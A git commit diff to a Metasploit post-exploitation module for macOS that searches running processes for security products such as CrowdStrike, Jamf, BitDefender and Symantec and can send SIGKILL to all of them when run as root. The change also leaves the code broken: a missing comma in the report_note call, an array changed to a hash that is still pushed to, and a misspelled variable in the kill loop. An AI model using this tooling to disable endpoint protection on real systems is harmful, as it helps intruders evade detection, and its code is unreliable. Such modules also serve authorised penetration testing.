e6f672f627f51c56dc47748a7f7a86900755d923
Corey <gardnerappdevelopment@gmail.com>
2026-08-04 15:22:34 -0400

    Add more products simplify module

--- modules/post/osx/gather/antivirus_hunter.rb
+++ modules/post/osx/gather/antivirus_hunter.rb
@@ -14,8 +14,8 @@ class MetasploitModule < Msf::Post
         info,
         'OSX Antivirus Hunter' => 'OSX Antivirus Hunter: Enumerate and disable antivirus products',
         'Description' => %q{
-          This module enumerates OSX systems for the presence of antivirus products. Target Products include: Objective-Cee, Kaspersky,
-          BitDefender and CrowdStrike. Installation is determined via file artifiacts and processes. The CUSTOM_PRODS option specifies
+          This module enumerates OSX systems for the presence of antivirus and other defensive products. This module functions by enumerating 
+          the running processes on a device. The CUSTOM_PRODS option specifies
           a file which contains a list of additional security products to hunt for, each of which will be seperated by a new
           line character. All searching will be done grep wise, therefore you don't need to pass in a specific file or process name. If run
           with root privilleges the KILL_PROCESSES option will send a kill signal to the security processes detected by this module.
@@ -41,7 +41,7 @@ class MetasploitModule < Msf::Post
                         false,
                         'File containing a list of AV products to hunt for. Each value should be seperated by a newline character and matching will be done in a case insensitive fashion', nil
                       ]),
-        OptBool.new('KILL_PROCESSES', [false, 'Send a SIGKILL signal to all of the processes this module finds, including custom processes.Root permissions are required. '])
+        OptBool.new('KILL_PROCESSES', [false, 'Send a SIGKILL signal to all of the processes this module finds, including custom processes. Root permissions are required.'])
       ]
     )
   end
@@ -57,24 +57,27 @@ class MetasploitModule < Msf::Post
     @processes.each do |process|
       if process['name'].include? product.to_s
         @av_processes.push(process)
-        print_good("Found potential process artifact #{process.inspect}")
+        print_good("Found potential process artifact for #{product}: #{process.inspect}")
+        # following post/linux/gather/enum_protections.rb
+        report_note(
+          host: session,
+          type: 'osx.protection',
+          data: {"#{product}": process.inspect} # need to test this
+          update: :unique_data
+        )
       end
     end
   end
 
-  def fail_no_root
-    fail_with(Failure::NoAccess, 'Current session is not root. Please escalate privileges before re-running this module.') unless is_root?
-  end
-
   def run
-    # TODO: add other AV product names.
-    products = ['LuLu', 'BlockBlock Helper', 'Do Not Disturb', 'ReiKey', 'RansomWhere', 'OverSight']
+    products = ['LuLu', 'BlockBlock Helper', 'Do Not Disturb', 'ReiKey', 'RansomWhere', 'OverSight', 'CrowdStrike', 
+                'Jamf', 'Netskope', 'Qualys', 'NetSkope', 'BitDefender', 'Symantec']
 
     print_status('Retrieving process list...')
     @processes = get_processes
 
     print_status('Hunting processes for AV products...')
-    @av_processes = []
+    @av_processes = {}
 
     products.each do |prod|
       enum_processes prod
@@ -88,21 +91,13 @@ class MetasploitModule < Msf::Post
       end
     end
 
-    if @av_processes.empty?
-      print_status 'No AV products found running on the system'
-      return
-    end
-
     if datastore['KILL_PROCESSES']
       print_status "Killing AV PID's"
-      fail_no_root
+      fail_with(Failure::NoAccess, "Root permissions are required to kill AV processes") unless is_root?
       @av_proccess.each do |process|
         res = kill_process process['pid']
         print_status "kill signal for #{process['name']} #{process['pid']} = #{res}"
       end
     end
-
-    # TODO: Do we need to fail if not root before killing processes?
-    # What are the names of otherdefensive binaries? Kapersky, CrowdStrike, BitDefender, etc.
   end
 end
